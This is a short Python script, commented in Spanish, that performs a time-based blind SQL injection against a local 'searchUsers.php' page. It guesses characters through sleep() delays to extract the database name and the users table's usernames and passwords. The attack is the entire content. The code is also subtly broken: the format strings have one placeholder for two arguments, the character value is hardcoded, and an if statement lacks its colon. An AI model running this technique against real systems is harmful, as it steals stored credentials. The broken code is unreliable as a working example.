```python
#!/usr/bin/python3
import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)
	
#CTRL+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)

	p2 = log.progress("Datos extraídos")

	extracted_info = ""

	for position in range(1, 150): #rango de numero de caracteres
		for character in range (33, 126): #rando de caracteres en el mapa ascii
			
			#Lista el nombre de la base de datos
			sqli_url = main_url + "?id=1 and if(ascii(substr(database(),%d,1))=72,sleep(0.5),1)" % (position, character)

			#COMENTA 1 DE LAS 2 QUERYS, SOLO FUNCIONA 1 O LA OTRA DE UNA VEZ

			#Lista usuarios y contraseñas de la tabla users
			sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=72,sleep(0.5),1)" % (position, character)

			p1.status(sqli_url)

			time_start = time.time()

			r = requests.get(sqli_url)

			time_end = time.time()
			
			if time_end - time_start > 0.5
				extracted_info += chr(character)
				p2.status(extracted_info)
				break

if __name__ == '__main__':

	makeSQLI()
```
